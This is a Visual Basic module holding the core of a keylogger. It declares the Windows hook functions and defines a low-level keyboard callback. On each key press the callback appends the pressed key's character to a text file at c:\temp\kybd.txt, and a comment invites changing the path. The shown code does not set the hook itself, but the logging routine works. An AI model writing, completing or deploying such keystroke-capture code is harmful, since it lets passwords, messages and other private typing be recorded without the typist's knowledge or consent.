Attribute VB_Name = "Module1"
Public Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal ncode As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Public Declare Function SetWindowsHook Lib "user32" Alias "SetWindowsHookA" (ByVal nFilterType As Long, ByVal pfnFilterProc As Long) As Long
Public Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Global Const WH_KEYBOARD_LL = 13

Public hook As Long

Public Const HC_ACTION = 0
Type HookStruct
    vkCode As Long
    scancode As Long
    flags As Long
    time As Long
    dwExtraInfo As Long
End Type

Public Function myfunc(ByVal code As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Dim kybd As HookStruct
    
    myfunc = True
    
        
    If code = HC_ACTION And wParam <> 257 Then
        CopyMemory kybd, ByVal lParam, Len(kybd)
        Open "c:\temp\kybd.txt" For Append As #1 ' change the path to any file
              Print #1, Chr(kybd.vkCode)
         Close #1
        myfunc = CallNextHookEx(hook, code, wParam, lParam)
    ElseIf code < 0 Then
        myfunc = CallNextHookEx(hook, code, wParam, lParam)
    End If

End Function


